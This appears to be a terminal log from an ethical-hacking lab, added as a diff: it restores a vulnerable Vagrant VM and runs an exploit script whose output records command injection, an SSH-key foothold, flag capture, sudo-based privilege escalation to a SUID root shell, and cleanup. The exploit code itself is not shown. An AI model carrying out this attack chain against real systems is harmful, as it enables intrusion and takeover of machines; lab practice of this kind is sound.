@@ -1,0 +1,40 @@
+┌──(sstarr㉿jesi)-[~/Documents/eh-stage6/evidence/lab-source]
+└─$ vagrant snapshot restore vulnerable clean-start
+==> vulnerable: Forcing shutdown of VM...
+==> vulnerable: Restoring the snapshot 'clean-start'...
+==> vulnerable: Checking if box 'generic/ubuntu2204' version '4.3.12' is up to date...
+==> vulnerable: Resuming suspended VM...
+==> vulnerable: Booting VM...
+==> vulnerable: Waiting for machine to boot. This may take a few minutes...
+    vulnerable: SSH address: 127.0.0.1:2222
+    vulnerable: SSH username: vagrant
+    vulnerable: SSH auth method: private key
+==> vulnerable: Machine booted and ready!
+==> vulnerable: Machine already provisioned. Run `vagrant provision` or use the `--provision`
+==> vulnerable: flag to force provisioning. Provisioners marked to run always will still run.
+  
+  
+ ┌──(sstarr㉿jesi)-[~/Documents/eh-stage6/exploit-chain]
+└─$ python3 exploit2.py --target 192.168.56.21 --phase full --output run_result.json
+[2026-08-02 18:43:26,944] INFO: === Exploit Chain START ===
+[2026-08-02 18:43:26,944] INFO: >>> PHASE: Preflight
+[2026-08-02 18:43:29,951] WARNING: Service unhealthy. Fixing via vagrant SSH...
+[2026-08-02 18:43:31,732] INFO: Service successfully restored.
+[2026-08-02 18:43:31,732] INFO: >>> PHASE: Foothold
+[2026-08-02 18:43:31,739] INFO: Command injection confirmed.
+[2026-08-02 18:43:31,739] INFO: Generating SSH key pair...
+[2026-08-02 18:43:31,739] WARNING: Ed25519 not available (type object 'Ed25519Key' has no attribute 'generate'), falling back to RSA.
+[2026-08-02 18:43:31,809] INFO: RSA key generated.
+[2026-08-02 18:43:31,809] INFO: Private key saved to /tmp/tmpv8rjn87a.tmp
+[2026-08-02 18:43:31,899] INFO: Foothold successful. SSH as support established.
+[2026-08-02 18:43:31,900] INFO: >>> PHASE: Flag Collection
+[2026-08-02 18:43:32,187] INFO: User flag obtained: UBI{A6_USER_81730E33E40959284138D11A}
+[2026-08-02 18:43:32,187] INFO: >>> PHASE: Privilege Escalation
+[2026-08-02 18:43:32,240] INFO: Privesc artifacts placed. Triggering sudo backup...
+[2026-08-02 18:43:32,414] INFO: Backup triggered. SUID shell should be at /tmp/rootshell.
+[2026-08-02 18:43:32,414] INFO: >>> PHASE: Root Proof
+[2026-08-02 18:43:32,462] INFO: Root flag obtained via SUID: UBI{A6_ROOT_5E78CBB890A6DEC276118C17}
+[2026-08-02 18:43:32,462] INFO: >>> PHASE: Cleanup (Idempotent)
+[2026-08-02 18:43:32,775] INFO: Cleanup complete.
+[2026-08-02 18:43:32,776] INFO: Cleanup report written to ./execution-transcripts/cleanup-results.xml
+[2026-08-02 18:43:32,776] INFO: === Exploit Chain SUCCESS ===
